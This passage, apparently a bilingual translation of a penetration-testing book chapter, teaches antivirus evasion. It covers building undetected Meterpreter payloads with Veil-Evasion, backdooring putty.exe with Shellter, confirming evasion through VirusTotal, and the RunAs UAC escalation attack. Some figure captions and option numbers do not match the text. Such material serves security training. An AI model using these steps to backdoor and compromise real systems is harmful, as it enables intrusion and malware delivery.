  zh: 为应对此问题，Metasploit框架允许对独立可执行文件进行编码，以绕过检测。
- en: Unfortunately, extensive testing of these executables at public sites, such
    as [virustotal.com](http://virustotal.com) and [antiscan.me](http://antiscan.me),
    has decreased their effectiveness in bypassing the AV software. However, this
    has given rise to frameworks such as Veil and Shellter, which can bypass the AV
    software by cross verifying the executable by uploading them directly to VirusTotal
    before planting the backdoor in the target environment.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 不幸的是，在公共网站上对这些可执行文件进行广泛测试，如[virustotal.com](http://virustotal.com)和[antiscan.me](http://antiscan.me)，已经降低了它们绕过杀毒软件的效果。然而，这也催生了像Veil和Shellter这样的框架，它们通过在将后门植入目标环境之前，将可执行文件直接上传到VirusTotal并进行交叉验证，从而绕过杀毒软件。
- en: Using the Veil framework
  id: totrans-100
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用Veil框架
- en: 'The Veil framework is another AV-evasion framework, written by Chris Truncer,
    and called Veil-Evasion, which provides effective protection against, and detection
    of, any standalone exploits for endpoints and servers. Although this framework
    is stalled (not supported) by the creator, this tool still can still be used by
    attackers to render payloads undetectable by further modifying the tool-created
    payloads. The latest version of the Veil framework, as of August 2021, is 3.1.14\.
    The framework consists of two tools: **Evasion** and **Ordnance**. The Veil framework
    is available from Kali repositories and is automatically installed by simply entering
    `sudo apt install veil` in the terminal.'
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: Veil框架是另一个AV规避框架，由Chris Truncer编写，名为Veil-Evasion，提供有效的保护和检测针对终端和服务器的独立漏洞攻击。虽然该框架已被创作者停滞（不再支持），但攻击者仍然可以通过进一步修改工具创建的有效载荷，使其不被检测到。Veil框架的最新版本为2021年8月发布的3.1.14。该框架由两个工具组成：**Evasion**
    和 **Ordnance**。Veil框架可以通过Kali仓库获得，用户只需在终端中输入`sudo apt install veil`即可自动安装。
- en: If you receive any errors during installation, rerun `/usr/share/veil/config/setup.sh
    --force --silent`.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 如果在安装过程中遇到任何错误，请重新运行 `/usr/share/veil/config/setup.sh --force --silent`。
- en: Evasion aggregates various techniques into a framework that simplifies management,
    while Ordnance generates the shellcode for supported payloads to further create
    new exploits for known vulnerabilities.
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: Evasion 将各种技术聚合成一个框架，简化管理，而 Ordnance 为支持的有效载荷生成 shellcode，进一步创造已知漏洞的新漏洞利用。
- en: 'As a framework, Veil takes several features, which include the following:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 作为一个框架，Veil 包含多个功能，具体如下：
- en: It incorporates custom shellcode in a variety of programming languages, including
    C, C#, and Python
  id: totrans-105
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 它将自定义 shellcode 集成到多种编程语言中，包括 C、C# 和 Python。
- en: It can use Metasploit-generated shellcode, or you can create your own using
    Ordnance
  id: totrans-106
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 它可以使用 Metasploit 生成的 shellcode，或者你可以使用 Ordnance 创建你自己的 shellcode。
- en: It can integrate third-party tools such as Hyperion (which encrypts an EXE file
    with AES 128-bit encryption), PEScrambler, and BackDoor Factory
  id: totrans-107
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 它可以集成第三方工具，如 Hyperion（使用 AES 128 位加密加密 EXE 文件）、PEScrambler 和 BackDoor Factory。
- en: Payloads can be generated and seamlessly substituted into all PsExec, Python,
    and `.exe` calls
  id: totrans-108
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 有效载荷可以被生成并无缝地替换到所有 PsExec、Python 和 `.exe` 调用中。
- en: Users can reuse shellcode or implement their own encryption methods
  id: totrans-109
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 用户可以重复使用 shellcode 或实现自己的加密方法。
- en: Its functionality can be scripted to automate deployment
  id: totrans-110
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 它的功能可以通过脚本化来自动化部署。
- en: 'Veil can generate an exploit payload; the standalone payloads include the following
    options:'
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: Veil 可以生成一个漏洞利用有效载荷；独立的有效载荷选项包括以下内容：
- en: Minimal Python installation to invoke shellcode; it uploads a minimal `Python.zip`
    installation and the 7Zip binary. The Python environment is unzipped, invoking
    the shellcode. Since the only files that interact with the victim are trusted
    Python libraries and the interpreter, the victim’s AV does not detect any unusual
    activity.
  id: totrans-112
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 最小化的 Python 安装用于调用 shellcode；它上传一个最小的 `Python.zip` 安装包和 7Zip 二进制文件。Python 环境被解压后，触发
    shellcode。由于与受害者交互的唯一文件是受信任的 Python 库和解释器，受害者的防病毒软件不会检测到任何异常活动。
- en: The Sethc backdoor configures the victim’s registry to launch the RDP sticky
    keys backdoor.
  id: totrans-113
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Sethc 后门配置受害者的注册表以启动 RDP 粘滞键后门。
- en: A PowerShell shellcode injector.
  id: totrans-114
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 一个 PowerShell shellcode 注入器。
- en: 'When the payloads have been created, they can be delivered to the target in
    one of the following two ways:'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 当有效载荷创建完成后，它们可以通过以下两种方式之一传送到目标：
- en: Upload and execute using Impacket and the PTH toolkit
  id: totrans-116
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 Impacket 和 PTH 工具包上传并执行。
- en: UNC invocation
  id: totrans-117
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: UNC 调用
- en: 'Veil presents the user with the main menu, which provides two tools to select
    from, and a number of payload modules that are loaded, as well as the available
    commands. Typing `use Evasion` will take us to the Evasion tool, while the `list`
    command will list all the available `payloads`. The Veil framework’s initial launch
    screen is shown in *Figure 9.11*:'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: Veil 向用户展示主菜单，提供两个工具供选择，并加载多个有效载荷模块以及可用的命令。输入 `use Evasion` 将带我们进入 Evasion 工具，而
    `list` 命令会列出所有可用的 `payloads`。Veil 框架的初始启动屏幕如 *图 9.11* 所示：
- en: '![](../Images/B17765_09_11.png)'
  id: totrans-119
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_11.png)'
- en: 'Figure 9.11: Main menu of the Veil framework'
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.11：Veil 框架的主菜单
- en: 'Presently, there are 41 payloads designed to bypass antivirus software by employing
    encryption or direct injection into the memory space, in the Evasion tool. These
    payloads are shown in *Figure 9.12*:'
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 目前，Evasion 工具中有 41 个有效载荷，旨在通过使用加密或直接注入内存空间来绕过防病毒软件。这些有效载荷在 *图 9.12* 中展示：
- en: '![](../Images/B17765_09_12.png)'
  id: totrans-122
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_12.png)'
- en: 'Figure 9.12: Veil-Evasion options'
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.12：Veil-Evasion 选项
- en: To obtain information on a specific payload, type `info <payload number / payload
    name>` or `info <tab>` to autocomplete the payloads that are available. You can
    also just enter the number from the list. In the following example, we entered
    `14` to select the `python/shellcode_inject/aes_encrypt` payload by running `use
    29`.
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 要获取特定有效载荷的信息，输入 `info <有效载荷编号 / 有效载荷名称>` 或 `info <tab>` 来自动补全可用的有效载荷。你也可以直接输入列表中的编号。在以下示例中，我们输入了
    `14` 来选择 `python/shellcode_inject/aes_encrypt` 有效载荷，并运行 `use 29`。
- en: The exploit includes an `expire_payload` option. If the module is not executed
    by the target user within a specified timeframe, it is rendered inoperable and
    also includes `CLICKTRACK`, which sets the value of how many clicks the user has
    to make to execute the payload. This function contributes to the stealthiness
    of the attack.
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 利用程序包含一个`expire_payload`选项。如果模块在指定时间内没有被目标用户执行，它将失效，并且还包括`CLICKTRACK`，该选项设置用户执行有效载荷所需的点击次数。此功能有助于提高攻击的隐蔽性。
- en: 'Some of the required options are pre-filled with default values and descriptions.
    If a required value isn’t completed by default, the tester will need to do the
    following:'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 一些必填选项已预先填充了默认值和描述。如果某个必填项没有默认值，测试人员需要执行以下操作：
- en: Input a value before the payload can be generated. To set the value for an option,
    enter `set <option name>`.
  id: totrans-127
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在生成有效载荷之前，输入一个值。要设置选项的值，请输入`set <option name>`。
- en: Then type the desired value. To accept the default options and create the exploit,
    type `generate` in the Veil-Evasion shell.
  id: totrans-128
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 然后输入所需的值。要接受默认选项并创建利用程序，请在 Veil-Evasion shell 中输入`generate`。
- en: There is a known bug that will throw error messages relating to encryption.
    Testers can edit the file located at `/usr/share/veil/tools/evasion/evasion_common/encryption.py`
    and edit line 21 from `aes_cipher_object = AES.new(random_aes_key, AES.MODE_CBC,
    iv)` to `es_cipher_object = AES.new(random_aes_key.encode('utf-8'), AES.MODE_CBC,
    iv.encode('utf-8'))` without the quotes. That should fix the error message without
    any problem.
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 存在一个已知的错误，可能会抛出与加密相关的错误信息。测试人员可以编辑位于`/usr/share/veil/tools/evasion/evasion_common/encryption.py`的文件，将第
    21 行的`aes_cipher_object = AES.new(random_aes_key, AES.MODE_CBC, iv)`修改为`aes_cipher_object
    = AES.new(random_aes_key.encode('utf-8'), AES.MODE_CBC, iv.encode('utf-8'))`（去掉引号）。这样应该可以顺利修复错误信息。
- en: 'Ordnance is, by default, where you will be able to generate specific shellcode.
    If there is an error, it will default to `msfvenom` or custom shellcode. If the
    custom shellcode option is selected, enter the shellcode in the form of `\x01\x02`,
    without quotes and newlines (`\n`). If the default option `msfvenom` is selected,
    you will be prompted with the default payload choice of `windows/meterpreter/reverse_tcp`.
    If you wish to use another payload, press the *Tab* key to complete the available
    payloads. The available payloads are shown in *Figure 9.13*:'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 默认情况下，Ordnance 是你能够生成特定 shellcode 的地方。如果发生错误，它将默认使用`msfvenom`或自定义 shellcode。如果选择了自定义
    shellcode 选项，请以`\x01\x02`的形式输入 shellcode，去掉引号和换行符（`\n`）。如果选择默认选项`msfvenom`，则会提示选择默认有效载荷
    `windows/meterpreter/reverse_tcp`。如果你想使用其他有效载荷，请按 *Tab* 键以查看可用的有效载荷。可用的有效载荷在*图
    9.13*中显示：
- en: '![](../Images/B17765_09_13.png)'
  id: totrans-131
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_13.png)'
- en: 'Figure 9.13: Metasploit payload options in Veil-Evasion'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.13：Veil-Evasion 中的 Metasploit 有效载荷选项
- en: 'In *Figure 9.14*, pressing the *Tab* key was used to demonstrate some of the
    available payloads; however, the default (`windows/meterpreter/reverse_tcp`) was
    selected:'
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 在*图 9.14*中，按 *Tab* 键展示了一些可用的有效载荷；然而，默认选项（`windows/meterpreter/reverse_tcp`）被选中了：
- en: '![](../Images/B17765_09_14.png)'
  id: totrans-134
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_14.png)'
- en: 'Figure 9.14: Successfully creating a file with a payload'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.14：成功创建一个包含有效载荷的文件
- en: 'Veil-Evasion exploits can also be created directly from the terminal by using
    the following options. In this example, we use option 14 to create a payload executable
    using Go:'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: Veil-Evasion 利用程序也可以直接从终端创建，使用以下选项。在此示例中，我们使用选项 14 通过 Go 创建一个有效载荷可执行文件：
- en: '[PRE3]'
  id: totrans-137
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'The preceding command should output the file with the exploit executable, source
    code, and resource file to the Metasploit payload, as shown in *Figure 9.15*:'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 上述命令应输出包含有效载荷可执行文件、源代码和资源文件的文件，并将其传送到 Metasploit 有效载荷，如*图 9.15*所示：
- en: '![A screenshot of a computer  Description automatically generated with medium
    confidence](../Images/B17765_09_15.png)'
  id: totrans-139
  prefs: []
  type: TYPE_IMG
  zh: '![计算机屏幕截图  描述自动生成，信心中等](../Images/B17765_09_15.png)'
- en: 'Figure 9.15: Successfully creating an exploit executable with the Go language'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.15：使用 Go 语言成功创建一个利用程序可执行文件
- en: Once an exploit has been created, the tester should verify the payload against
    VirusTotal to ensure that it will not trigger an alert when it is placed on the
    target system. If the payload sample is submitted directly to VirusTotal and its
    behavior flags it as malicious software, then a signature update against the submission
    can be released by antivirus vendors in as little as 1 hour. This is why users
    are admonished with the `don't submit samples to any online scanner!` message.
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦创建了漏洞利用，测试人员应通过VirusTotal验证负载，以确保它在放置到目标系统时不会触发警报。如果负载样本直接提交到VirusTotal并且其行为被标记为恶意软件，则防病毒厂商可能会在1小时内发布针对该提交的签名更新。这就是为什么用户被告诫`不要将样本提交给任何在线扫描器！`的原因。
- en: 'Veil-Evasion allows testers to use a safe check against VirusTotal. When any
    payload is created, an SHA1 hash is created and added to `hashes.txt`, located
    in the `~/veil-output` directory. Testers can invoke the `checkvt` script to submit
    the hashes to VirusTotal, which will check the SHA1 hash values against its malware
    database. If a Veil-Evasion payload triggers a match, then the tester knows that
    it may be detected by the target system. If it does not trigger a match, then
    the exploit payload will bypass the antivirus software. A successful lookup (not
    detectable by AV) using the `checkvt` command is shown as follows:'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: Veil-Evasion允许测试人员通过VirusTotal进行安全检查。当任何负载被创建时，会生成一个SHA1哈希值并添加到`hashes.txt`中，该文件位于`~/veil-output`目录中。测试人员可以调用`checkvt`脚本将哈希值提交到VirusTotal，VirusTotal会将SHA1哈希值与其恶意软件数据库进行匹配。如果Veil-Evasion负载触发了匹配，那么测试人员知道它可能会被目标系统检测到。如果没有触发匹配，那么漏洞利用负载将绕过防病毒软件。使用`checkvt`命令成功查找（防病毒无法检测到）如下所示：
- en: '![](../Images/B17765_09_16.png)'
  id: totrans-143
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_16.png)'
- en: 'Figure 9.16: Successfully creating an exploit executable with the Go language'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.16：使用Go语言成功创建漏洞利用可执行文件
- en: If the attackers receive any error message while running the `checkvt` command,
    ensure that you edit the file located at `/usr/share/veil/tools/evasion/scripts/vt-notify/vt-notify.rb`
    and change `$apikey` to your key.
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 如果攻击者在运行`checkvt`命令时收到任何错误消息，请确保编辑位于`/usr/share/veil/tools/evasion/scripts/vt-notify/vt-notify.rb`文件中的`$apikey`，并将其更改为你的密钥。
- en: Using Shellter
  id: totrans-146
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用Shellter
- en: Shellter is another antivirus evasion tool that infects the PE dynamically and
    is also used to inject shellcode into any **32-bit** native Windows application.
    It allows attackers to either customize the payload or utilize the Metasploit
    framework. The majority of antiviruses will not be able to identify the malicious
    executable, depending upon how the attackers re-encode the endless number of signatures.
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: Shellter是另一种防病毒规避工具，它动态地感染PE，并且也用于将shellcode注入任何**32位**原生Windows应用程序。它允许攻击者自定义负载或使用Metasploit框架。大多数防病毒软件无法识别恶意可执行文件，具体取决于攻击者如何重新编码无数个签名。
- en: 'Shellter can be installed by running `sudo apt-get install shellter` in the
    terminal. Once the application is installed, we should be able to open Shellter
    by issuing the `sudo shellter` command in the terminal and then see *Figure 9.17*,
    where we are ready to create a backdoor on any executable:'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: Shellter可以通过在终端运行`sudo apt-get install shellter`来安装。一旦应用程序安装完成，我们应该能够通过在终端中输入`sudo
    shellter`命令来启动Shellter，然后查看*图9.17*，此时我们已经准备好在任何可执行文件上创建后门：
- en: '![](../Images/B17765_09_17.png)'
  id: totrans-149
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_17.png)'
- en: 'Figure 9.17: Shellter main menu from Kali Linux'
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.17：来自Kali Linux的Shellter主菜单
- en: 'Once Shellter is launched, the following are the typical steps involved in
    creating a malicious executable:'
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦启动Shellter，以下是创建恶意可执行文件的典型步骤：
- en: Attackers should be given the option to select either `Auto` (`A`) or `Manual`
    (`M`), and `Help` (`H`). For demonstration purposes, we will utilize `Auto` mode.
  id: totrans-152
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 攻击者应当有选择`Auto`（`A`）或`Manual`（`M`）以及`Help`（`H`）的选项。为了演示，我们将使用`Auto`模式。
- en: The next step is to provide the PE target file; attackers can choose any `.exe`
    file or utilize the executables in `/usr/share/windows-binaries/`. In this case,
    we have utilized 32-bit `putty.exe`.
  id: totrans-153
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是提供PE目标文件；攻击者可以选择任何`.exe`文件或使用`/usr/share/windows-binaries/`中的可执行文件。在本例中，我们使用了32位的`putty.exe`。
- en: Once the PE target file location is provided, Shellter will be able to disassemble
    the PE file, as shown in *Figure 9.18*:![](../Images/B17765_09_18.png)
  id: totrans-154
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦提供了PE目标文件位置，Shellter将能够反汇编PE文件，如*图9.18*所示：![](../Images/B17765_09_18.png)
- en: 'Figure 9.18: Shellter compiling a 32-bit application with the custom DLL injection'
  id: totrans-155
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图9.18：Shellter编译带有自定义DLL注入的32位应用程序
- en: When disassembly is complete, Shellter will provide the option to enable stealth
    mode.
  id: totrans-156
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当反汇编完成后，Shellter会提供启用隐身模式的选项。
- en: Following stealth mode selection, you will be able to inject the listed payloads
    into the same PE file, as shown in *Figure 9.19*, or you can press the *C* key
    for a custom payload:![](../Images/B17765_09_19.png)
  id: totrans-157
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择隐身模式后，你将能够将列出的有效载荷注入到相同的PE文件中，如*图9.19*所示，或者你可以按*C*键选择自定义有效载荷：![](../Images/B17765_09_19.png)
- en: 'Figure 9.19: Selecting the payload options in Shellter'
  id: totrans-158
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图9.19：在Shellter中选择有效载荷选项
- en: In this example, we utilize `Meterpreter_reverse_HTTPS` and provide `LHOST`
    and `LPORT`, as shown in *Figure 9.20*:![](../Images/B17765_09_20.png)
  id: totrans-159
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在这个例子中，我们使用`Meterpreter_reverse_HTTPS`并提供`LHOST`和`LPORT`，如*图9.20*所示：![](../Images/B17765_09_20.png)
- en: 'Figure 9.20: Successfully setting the payload options'
  id: totrans-160
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图9.20：成功设置有效载荷选项
- en: All the required information is fed to Shellter. At the same time, the PE file
    provided as input is now injected with the payload and the injection is complete.![](../Images/B17765_09_21.png)
  id: totrans-161
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 所有所需的信息都已输入到Shellter中。同时，作为输入的PE文件现在已经注入了有效载荷，注入过程完成了。![](../Images/B17765_09_21.png)
- en: 'Figure 9.21: Shellter main menu from Kali Linux'
  id: totrans-162
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图9.21：Kali Linux中的Shellter主菜单
- en: 'Once this executable is delivered to the victim, attackers will now be able
    to open up the listener as per the payload; in our example, `LHOST` is `10.10.10.12`
    and `LPORT` is `443`:'
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦这个可执行文件被传送到受害者那里，攻击者现在将能够根据有效载荷打开监听器；在我们的例子中，`LHOST`是`10.10.10.12`，`LPORT`是`443`：
- en: '[PRE4]'
  id: totrans-164
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'Now, you can save the preceding list of commands to a filename as `listener.rc`,
    and run it using Metasploit by running `msfconsole -r listener.rc`. Once the victim
    system opens without being blocked by the antivirus or any security controls,
    it should open the shell to the attacker’s IP without any trouble, as shown in
    *Figure 9.22*:'
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，你可以将前面的命令列表保存为文件名`listener.rc`，然后通过运行`msfconsole -r listener.rc`在Metasploit中执行。当受害者系统在没有被防病毒软件或任何安全控制阻止的情况下启动时，它应该会顺利打开到攻击者的IP地址的shell，如*图9.22*所示：
- en: '![Text  Description automatically generated](../Images/B17765_09_22.png)'
  id: totrans-166
  prefs: []
  type: TYPE_IMG
  zh: '![Text  Description automatically generated](../Images/B17765_09_22.png)'
- en: 'Figure 9.22: Shellter main menu from Kali Linux'
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.22：Kali Linux中的Shellter主菜单
- en: That concludes the most effective way of building a backdoor and planting it
    on a victim system.
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 这总结了构建后门并将其植入受害者系统的最有效方式。
- en: The majority of antiviruses will be able to catch the reverse Meterpreter shell;
    however, it is recommended that penetration testers encode multiple times before
    dropping the exploit.
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数防病毒软件能够捕捉到反向Meterpreter shell；然而，建议渗透测试人员在投放漏洞之前进行多次编码。
- en: Going fileless and evading antivirus
  id: totrans-170
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 无文件运行并避开防病毒
- en: Most organizations allow users to access their internal infrastructure on all
    the network segments or have a flat network. In some organizations, particularly
    in the banking sector, the networks are segregated, and strict access controls
    are put in place. As an example, an internal firewall rule may be created to permit
    only port `80` or `443` as outbound communication and block all the other ports.
    So, it is recommended to utilize ports `80` or `443` for all listeners during
    testing. In this section, we will explore some quick wins to bypass security controls
    and take over a given system.
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数组织允许用户访问所有网络段的内部基础设施，或者采用扁平化网络。在一些组织中，特别是在银行业，网络是隔离的，并且实施了严格的访问控制。例如，可能会创建一个内部防火墙规则，只允许`80`或`443`端口作为外向通信，并阻止所有其他端口。因此，建议在测试期间使用`80`或`443`端口作为所有监听器的端口。在本节中，我们将探讨绕过安全控制并接管目标系统的一些快速方法。
- en: Bypassing Windows operating system controls
  id: totrans-172
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 绕过Windows操作系统的控制
- en: In every corporate environment, we see that all the endpoints provided to end
    users are typically Windows operating systems. The likelihood of exploiting Windows
    is always high due to its level of usage. In this section, we will focus on some
    of the specific Windows operating system security controls and how to bypass them
    post access to the endpoint. In the following example, we have utilized a Windows
    10 virtual machine for demonstration purposes.
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 在每个企业环境中，我们看到提供给终端用户的所有终端通常都是Windows操作系统。由于Windows的使用广泛，利用Windows的可能性总是很高。在本节中，我们将专注于一些特定的Windows操作系统安全控制以及如何在访问终端后绕过它们。在下面的例子中，我们使用了一个Windows
    10虚拟机进行演示。
- en: User Account Control (UAC)
  id: totrans-174
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 用户账户控制（UAC）
- en: Recent developments show there are different ways to bypass Windows UAC, which
    can be found at [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME).
    This project is primarily focused on reverse-engineering malware. All the source
    code is written in C# and C; this will require attackers to compile the code and
    then perform the informed attacks.
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 最近的开发显示，有不同的方法可以绕过 Windows UAC，详细信息请参考 [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)。该项目主要集中在恶意软件的逆向工程。所有源代码均使用
    C# 和 C 编写，这需要攻击者编译代码并执行已知的攻击。
- en: 'Microsoft introduced security controls to restrict processes from running at
    three different integrity levels: high, medium, and low. A high integrity process
    has administrator rights, a medium-level process runs with a standard user’s rights,
    and a low integrity process is restricted, ensuring programs do minimal damage
    if they are compromised.'
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 微软引入了安全控制措施，限制进程在三个不同的完整性级别下运行：高、低和中。高完整性进程具有管理员权限，中级进程以标准用户权限运行，低完整性进程受到限制，确保如果程序被攻破，造成的损害最小。
- en: 'To perform any privileged actions, a program must be run as an administrator
    and comply with the UAC settings. The four UAC settings are as follows:'
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 要执行任何特权操作，程序必须以管理员身份运行并遵守 UAC 设置。四个 UAC 设置如下：
- en: '**Always notify**: This is the most stringent setting, and it will prompt the
    local user whenever any program wants to use higher-level privileges.'
  id: totrans-178
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**始终通知**：这是最严格的设置，任何程序想要使用更高权限时，都会提示本地用户。'
- en: '**Notify me only when programs try to make changes to my computer**: This is
    the default UAC setting. It does not prompt the user when a native Windows program
    requests higher-level privileges. However, it will prompt if a third-party program
    wants elevated privileges.'
  id: totrans-179
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**仅在程序尝试更改我的计算机时通知我**：这是默认的 UAC 设置。当本地 Windows 程序请求更高权限时，它不会提示用户。然而，如果第三方程序请求提升权限，则会提示。'
- en: '**Notify me only when programs try to make changes to my computer (don’t dim
    my desktop)**: This is the same as the default setting, but it does not dim the
    system’s monitor when prompting the user.'
  id: totrans-180
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**仅在程序尝试更改我的计算机时通知我（不要变暗我的桌面）**：这与默认设置相同，但在提示用户时不会使系统显示器变暗。'
- en: '**Never notify**: This option reverts the system to pre-Vista days. If the
    user is an administrator, all programs will run with high integrity.'
  id: totrans-181
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**从不通知**：此选项将系统恢复到 Vista 之前的状态。如果用户是管理员，则所有程序将以高完整性运行。'
- en: 'Therefore, immediately after exploitation, the tester (and attacker) wants
    to know the following two things:'
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 因此，在利用之后，测试者（和攻击者）希望了解以下两件事：
- en: Who is the user that the system has identified?
  id: totrans-183
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 系统已识别的用户是谁？
- en: What rights do they have on the system?
  id: totrans-184
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 它们在系统中具有什么权限？
- en: 'This can be determined using the following command:'
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 可以使用以下命令来确定：
- en: '[PRE5]'
  id: totrans-186
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'Here, a compromised system is operating in a high-integrity context, as shown
    by the `Mandatory Label\High Mandatory Level` label in *Figure 9.23*:'
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，一个受损的系统正在高完整性上下文中运行，如 *图 9.23* 中所示的 `Mandatory Label\High Mandatory Level`
    标签：
- en: '![](../Images/B17765_09_23.png)'
  id: totrans-188
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_23.png)'
- en: 'Figure 9.23: Common Windows privileges of an individual account'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.23：个人账户的常见 Windows 权限
- en: If `Label` is `Mandatory Label\Medium Mandatory Level`, the tester will need
    to elevate from standard user privileges to administrator rights in order for
    many of the post-exploit steps to be successful.
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 如果 `Label` 是 `Mandatory Label\Medium Mandatory Level`，则测试者需要从标准用户权限提升到管理员权限，以便许多后续的利用步骤能够成功。
- en: Assuming the attacker has a limited shell from the Shellter or Veil exploit,
    the first option to elevate privileges is to run `exploit/windows/local/ask` from
    Metasploit, which launches the `RunAs` attack. This will create an executable
    that, when invoked, will run a program to request elevated rights. The executable
    should be created using the `EXE::Custom` option or encrypted using the Veil framework
    to avoid detection by the local antivirus.
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 假设攻击者从 Shellter 或 Veil 漏洞获取了一个受限的 shell，提升权限的第一个选项是从 Metasploit 运行 `exploit/windows/local/ask`，这将启动
    `RunAs` 攻击。此操作将创建一个可执行文件，当调用时，它会运行一个请求提升权限的程序。可执行文件应该使用 `EXE::Custom` 选项创建，或者使用
    Veil 框架加密，以避免被本地杀毒软件检测到。
- en: 'The disadvantage of the `RunAs` attack is that the user will be prompted that
    a program from an unknown publisher wants to make changes to the computer. This
    alert may cause the privilege escalation to be identified as an attack, as shown
    in *Figure 9.24*:'
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: '`RunAs`攻击的缺点是，用户会被提示一个来自未知发布者的程序尝试对计算机进行更改。这个警告可能会使权限提升被识别为攻击，如*图9.24*所示：'
